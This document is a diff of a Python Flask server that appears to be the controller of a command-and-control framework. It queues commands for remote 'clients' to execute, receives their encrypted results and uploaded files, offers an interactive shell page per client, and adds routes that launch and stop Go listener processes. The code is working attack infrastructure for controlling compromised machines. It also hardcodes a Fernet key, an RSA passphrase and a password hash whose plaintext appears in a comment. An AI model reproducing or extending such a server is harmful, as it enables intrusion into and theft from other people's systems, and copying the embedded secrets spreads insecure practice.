@@ -5,30 +5,27 @@ from functools import wraps
 from datetime import datetime, timedelta
 from flask import abort
 from flask import g, request, redirect, url_for
-
+import psutil
+import subprocess
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import  PKCS1_OAEP
-
+import platform
 from cryptography.fernet import Fernet
-
-
+from cryptography.fernet import Fernet, InvalidToken
+import re
 app = Flask(__name__)
 
-SECRET_HASHED_PASSWORD = '834cc37634bdf8aaf6cb5e11413864b9ce80551061276a68a8585d84195a7f16' 
-
-fernet_key = b'aVGsG0y54V383Namkj91_AVvu1RT-JaseCRuZCP7I4o='
-
 private_key_path = 'private_key.pem'
-
-passphrase="embracedarkness"
-
-hmac_secret_key = b'SecretKeyForHMAC' #optional
+hmac_secret_key = b'SecretKeyForHMAC'
 
 app.jinja_env.autoescape = True
+@app.template_filter('matches_pattern')
+def matches_pattern(filename, pattern):
+    return re.match(pattern, filename) is not None
 
 
 clients = {}
-current_image_url = None 
+current_image_url = None
 # Store commands for the clients to execute
 commands = {}
 
@@ -37,6 +34,8 @@ results = {}
 registered_clients = set()
 # Directory where uploaded files will be saved
 UPLOAD_FOLDER = 'uploaded_files'
+LISTENERS_FOLDER = 'listeners'
+app.config['listeners'] = LISTENERS_FOLDER
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 CLIENT_DOWN_TIMEOUT = timedelta(seconds=30)
 CHECK_INTERVAL = 30
@@ -48,9 +47,9 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 user_authenticated = False
 COOKIE_NAME = 'user_authentication'
-COOKIE_MAX_AGE = 900   
+COOKIE_MAX_AGE = 1500   # 5 minutes in seconds
 
-
+SECRET_HASHED_PASSWORD = '834cc37634bdf8aaf6cb5e11413864b9ce80551061276a68a8585d84195a7f16'  # Example hash for 'embracedarkness-12345'
 
 def requires_authentication(f):
     @wraps(f)
@@ -145,7 +144,7 @@ def handle_file_upload(file_content, filename):
 @app.route('/upload', methods=['POST'])
 def upload_file():
     if 'file' in request.files:
-        global fernet_key
+        fernet_key = b'saEPhdTYsxeDrgNSG3S-wb0TBrZax2Q-p_T8igYq-KQ='
         fernet = Fernet(fernet_key)
         encrypted_file = request.files['file']
         encrypted_content = encrypted_file.read()
@@ -153,14 +152,18 @@ def upload_file():
         # Get the original filename from the encrypted file
         original_filename = encrypted_file.filename
 
-        # Decrypt the content
-        decrypted_content = fernet.decrypt(encrypted_content)
+        try:
+                    # Try to decrypt the content
+                    decrypted_content = fernet.decrypt(encrypted_content)
+        except InvalidToken:
+                    # If decryption fails, use the original encrypted content
+                    decrypted_content = encrypted_content
 
-        # Call the handle_file_upload function with the decrypted content and original filename
+                # Call the handle_file_upload function with the decrypted content and original filename
         return handle_file_upload(decrypted_content, original_filename)
 
     return jsonify({"error": "No file uploaded"}), 400
-
+    
 @app.route('/uploaded_files/<filename>')
 @requires_authentication
 def uploaded_file(filename):
@@ -201,8 +204,7 @@ def add_command(client_id):
 # Load the server's private key
 
 with open(private_key_path, 'rb') as file:
-    
-    server_private_key = RSA.import_key(file.read(), passphrase=passphrase)
+    server_private_key = RSA.import_key(file.read(), passphrase="everlastingcrown009")
 
 def decrypt_data(encrypted_data):
     cipher_rsa = PKCS1_OAEP.new(server_private_key)
@@ -213,8 +215,9 @@ def decrypt_data(encrypted_data):
 def receive_results(client_id):
     try:
         encrypted_data_hex = request.json.get('result')
-        
+        print("Received encrypted data:", encrypted_data_hex)
 
+        
         # Convert hex to bytes
         encrypted_data = bytes.fromhex(encrypted_data_hex)
 
@@ -226,6 +229,9 @@ def receive_results(client_id):
         else:
             return jsonify({"error": "Invalid data format or signature."}), 400
     except Exception as e:
+        encrypted_data_hex = request.json.get('result')
+        results.setdefault(client_id, []).append(encrypted_data_hex)
+        print("Error:", e)
         return jsonify({"error": str(e)}), 500
 
 @app.route('/results/<client_id>', methods=['GET'])
@@ -326,9 +332,94 @@ def interact():
         # Your logic for handling the GET request
 
         return render_template('shell.html', clientID=clientID)
+    
+
+
+LISTENERS_FOLDER = 'listeners'
+listeners = {}  # Dictionary to store listener processes and their statuses
+
+def list_listeners():
+    listeners_list = []
+    for listener_file in os.listdir(LISTENERS_FOLDER):
+        if listener_file.endswith('.go'):
+            listener_name = listener_file[:-3]  # Remove '.py' extension
+            listener_path = os.path.join(LISTENERS_FOLDER, listener_file)
+            process_pid = listeners.get(listener_name, {}).get("pid")  # Get PID from stored listeners
+            status = "Running" if is_listener_running(process_pid) else "Stopped"
+            listeners_list.append({"name": listener_name, "status": status})
+    return listeners_list
+
+
+def start_listener(listener_name, host, port):
+    process = subprocess.Popen(['go','run' ,f'listeners/{listener_name}.go', host+":"+port])
+    return process.pid  # Return the process ID
+
+def is_listener_running(process_pid):
+    if process_pid is not None:
+        return psutil.pid_exists(process_pid)
+    return False
+
+
+@app.route('/listeners_html', methods=['GET'])
+def display_listeners_html():
+    listeners_list = list_listeners()
+    print(listeners_list)
+    return render_template('listeners.html', listeners=listeners_list)
+
+
+@app.route('/listeners', methods=['GET'])
+def display_listeners():
+    listeners_list = list_listeners()
+    return jsonify({"listeners": listeners_list})
+
+
+@app.route('/start_listeners', methods=['POST'])
+def start_listeners_route():
+    global listeners
+    data = request.json
+    host = data.get('host', '127.0.0.1')
+    port = data.get('port', 5000)
+
+    for listener_name in os.listdir(LISTENERS_FOLDER):
+        if listener_name.endswith('.go'):
+            listener_name_without_ext, _ = os.path.splitext(listener_name)
+            if listener_name_without_ext not in listeners:
+                process_pid = start_listener(listener_name_without_ext, host, port)
+                listeners[listener_name_without_ext] = {"pid": process_pid, "status": "Running"}
+    return jsonify({"message": "Listeners started successfully."}), 200
+
+
+@app.route('/stop_listener', methods=['POST'])
+def stop_listener_route():
+    global listeners
+    data = request.json
+    listener_name = data.get('listener')
+    if listener_name in listeners:
+        process_pid = listeners[listener_name]["pid"]
+        if is_listener_running(process_pid):
+            if platform.system() == 'Windows':
+                subprocess.run(['taskkill', '/F', '/T', '/PID', str(process_pid)])  # Terminate the process on Windows
+            elif platform.system() == 'Linux':
+                subprocess.run(['kill', str(process_pid)])  # Terminate the process on Linux
+            else:
+                return jsonify({"error": "Unsupported operating system."}), 500
+        del listeners[listener_name]
+        return jsonify({"message": f"Listener '{listener_name}' stopped successfully."}), 200
+    else:
+        return jsonify({"error": f"Listener '{listener_name}' not found."}), 404
+
+@app.route('/stop_listeners', methods=['POST'])
+def stop_listeners_route():
+    global listeners
+    for listener_name, info in listeners.items():
+        process_pid = info["pid"]
+        if is_listener_running(process_pid):
+            subprocess.run(['kill', str(process_pid)])  # Terminate the process
+    listeners.clear()
+    return jsonify({"message": "All listeners stopped successfully."}), 200
 
 
 if __name__ == '__main__':
 
   
-    app.run(debug=False, port=80)
+    app.run(debug=False, port=8080)
